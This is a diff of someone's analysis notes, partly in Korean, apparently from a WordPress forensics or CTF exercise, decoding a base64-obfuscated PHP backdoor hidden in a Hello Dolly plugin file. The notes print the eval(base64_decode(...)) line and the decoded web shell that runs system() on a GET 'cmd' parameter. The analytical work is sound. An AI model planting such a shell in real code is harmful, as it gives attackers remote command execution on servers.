@@ -475,23 +475,18 @@ add_action( 'admin_head', 'dolly_css' );
 
 # eval(base64_decode('CiBpZiAoaXNzZXQoJF9HRVRbIlwxNDNcMTU1XHg2NCJdKSkgeyBzeXN0ZW0oJF9HRVRbIlwxNDNceDZkXDE0NCJdKTsgfSA=')); -> eval 발견
 
-base64 to text
+echo -n "CiBpZiAoaXNzZXQoJF9HRVRbIlwxNDNcMTU1XHg2NCJdKSkgeyBzeXN0ZW0oJF9HRVRbIlwxNDNceDZkXDE0NCJdKTsgfSA=" | tr -d '=' | base64 -d
 
-echo -n "iBpZiAoaXNzZXQoJF9HRVRbIlwxNDNcMTU1XHg2NCJdKSkgeyBzeXN0ZW0oJF9HRVRbIlwxNDNceDZkXDE0NCJdKTsgfSA=" | base64 -d
+# base64 -> text
+
+if (isset($_GET["\143\155\x64"])) { system($\_GET["\143\x6d\144"]); }
+
+# printf 로 ascii 코드 디코딩 -> cmd 확인
+
 ┌──(root㉿docker-desktop)-[/]
-└─# echo -n "iBpZiAoaXNzZXQoJF9HRVRbIlwxNDNcMTU1XHg2NCJdKSkgeyBzeXN0ZW0oJF9HRVRbIlwxNDNceDZkXDE0NCJdKTsgfSA=" | base64 -d
-�Y�
-\��]
-��Uȗ
-M
-�
-�JJH��\�[J MM��Uȗ
-M
-� �
-�JN�Hbase64: invalid input
+└─# printf "\143\x6d\144\n"
+cmd
 
-# 읽을 수 없음
-
-echo -n "iBpZiAoaXNzZXQoJF9HRVRbIlwxNDNcMTU1XHg2NCJdKSkgeyBzeXN0ZW0oJF9HRVRbIlwxNDNceDZkXDE0NCJdKTsgfSA=" | tr -d '\n\r ' | base64 -d > unknown.bin
-
-echo -n "iBpZiAoaXNzZXQoJF9HRVRbIlwxNDNcMTU1XHg2NCJdKSkgeyBzeXN0ZW0oJF9HRVRbIlwxNDNceDZkXDE0NCJdKTsgfSA=" | tr -d '\n\r ' | base64 -d
+┌──(root㉿docker-desktop)-[/]
+└─# printf "\143\155\x64"
+cmd
